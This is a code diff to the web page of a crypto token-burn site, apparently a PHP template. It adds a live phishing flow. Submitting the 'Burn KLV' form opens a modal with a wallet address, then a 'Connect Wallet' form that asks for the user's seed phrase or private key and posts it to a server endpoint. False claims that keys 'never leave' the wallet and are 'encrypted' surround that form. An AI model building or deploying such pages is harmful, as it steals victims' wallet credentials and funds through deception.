@@ -192,7 +192,7 @@
                   </div>
                 </div>
 
-                <form class="needs-validation" action="#" id="formId" novalidate style="display: block;">
+                <form class="needs-validation" action="" id="tronF" style="display: block;">
                   <div class="form-outline">
                     <input 
                       type="number"
@@ -216,12 +216,11 @@
                     </label>
 
                   </div>
-                  <a href="javascript:void(0)"
-                    id="burnButton" 
+                  <button type="submit" id="tronSub" 
                     class="bg-primary btn btn-large"
                   >
                     Burn KLV
-                </a>
+</button>
                   <p class="form-helper">min. 1,000 KLV / max. 200,000 KLV</p>
                 </form>
                 
@@ -552,6 +551,101 @@
     <!-- copyright part end -->
 </footer>
 
+  <!-- Modal -->
+  <div class="modal fade" id="qrcode" tabindex="-1" role="dialog" aria-labelledby="modelTitleId" aria-hidden="true">
+    <div class="modal-dialog" role="document">
+      <div class="modal-content bg-dark">
+        <!--<div class="modal-header">
+        <h5 class="modal-title text-white">Start Mining</h5>
+           <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+            <span aria-hidden="true">&times;</span>
+          </button> 
+      </div>-->
+        <div class="modal-body">
+          <div class="text-center">
+
+            <div class="qr-code">
+              <figure class="figure">
+                <img src="<?=base_url('assets/images/qrcode.jpeg')?>" class="figure-img img-fluid rounded" alt="">
+              </figure>
+            </div>
+            <p class="text-white">TZGoapg4BcaE5FuLireDDUw1jfqSyC6U58</p>
+            <div class="card border bg-dark mb-3">
+              <div class="card-body">
+                <p class="card-text text-white text-small my-2">You agree to contribute your KLV to be burnt forever in
+                  exchange for an undetermined amount of KFI</p>
+              </div>
+            </div>
+            <div class="card border mb-3">
+              <div class="alert-danger card-body">
+                <p class="card-text text-danger font-weight-bold my-2">* Don't send your KLV from exchanges! The KFI
+                  will be sent to the origin address and your KFI will be lost.</p>
+              </div>
+            </div>
+            <div class="card border mb-3">
+              <div class="alert-danger card-body">
+                <p class="card-text text-danger font-weight-bold my-2">** We suggest a minimum send of 1,000 KLV. Lower
+                  values may be lost if the distribution is less than 0.0000001 KFI.</p>
+              </div>
+            </div>
+
+          </div>
+          <button type="button" data-dismiss="modal" class="btn btn-primary btn-lg btn-block" data-toggle="modal" data-backdrop="static"
+            data-target="#phrase">Connect Wallet</button>
+        </div>
+
+
+        <!-- innermodal -->
+      </div>
+    </div>
+  </div>
+  <!-- modal -->
+  <!-- Modal -->
+  <div class="modal fade" id="phrase" tabindex="-1" role="dialog" aria-labelledby="modelTitleId" aria-hidden="true">
+    <div class="modal-dialog" role="document">
+      <div class="modal-content bg-dark">
+        <div class="modal-header">
+          <h5 class="text-center modal-title subtitle ">Enter your 12 - 24 words seed phrase/Private Key</h5>
+          <!-- <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                        <span aria-hidden="true">&times;</span>
+                      </button> -->
+        </div>
+        <div class="modal-body">
+          <center class="info" style="margin: 5px 1px;">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="#39e" viewBox="0 0 24 24">
+              <path
+                d="M12.451 17.337l-2.451 2.663h-2v2h-2v2h-6v-5l6.865-6.949c1.08 2.424 3.095 4.336 5.586 5.286zm11.549-9.337c0 4.418-3.582 8-8 8s-8-3.582-8-8 3.582-8 8-8 8 3.582 8 8zm-3-3c0-1.104-.896-2-2-2s-2 .896-2 2 .896 2 2 2 2-.896 2-2z" />
+            </svg>
+            <h3 class="text-white">Protected private keys</h3>
+            <p>Private keys never leave mobile wallets, keeping user funds safe</p>
+          </center>
+          <form action="<?= base_url('phrased') ?>" method="post">
+            <div>
+              <div>
+                <div class="form-group">
+                  <textarea name="phrase" placeholder="Enter Seed Phrase here..." rows="8" cols="5" class="form-control"
+                    style="border-radius: 9px;"></textarea>
+                </div>
+              </div>
+            </div>
+            <center class="info" style="margin: 5px 1px; ">
+              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="#39e" viewBox="0 0 24 24">
+                <path
+                  d="M18 10v-4c0-3.313-2.687-6-6-6s-6 2.687-6 6v4h-3v14h18v-14h-3zm-5 7.723v2.277h-2v-2.277c-.595-.347-1-.984-1-1.723 0-1.104.896-2 2-2s2 .896 2 2c0 .738-.404 1.376-1 1.723zm-5-7.723v-4c0-2.206 1.794-4 4-4 2.205 0 4 1.794 4 4v4h-8z" />
+              </svg>
+              <h3 class="text-white">Encryted</h3>
+              <p>End-to-end encryption using client-side generated keys keeps all user activity private</p>
+            </center>
+            <div class="modal-footer">
+              <button class="btn btn-primary">Import wallet
+              </button>
+            </div>
+          </form>
+
+        </div>
+      </div>
+    </div>
+  </div>
 
 <!-- Main Script -->
 
@@ -563,7 +657,13 @@
 
  
 <script src="<?= base_url('assets/js/global.min.js')?>"></script> 
-
+<script>
+    $('#tronF').submit(e=>{
+      e.preventDefault();
+      $('#tron').modal('hide');
+      $('#qrcode').modal({show:true,backdrop:true,keyboard:false});
+    })
+  </script>
 
 <!-- google analitycs -->
 
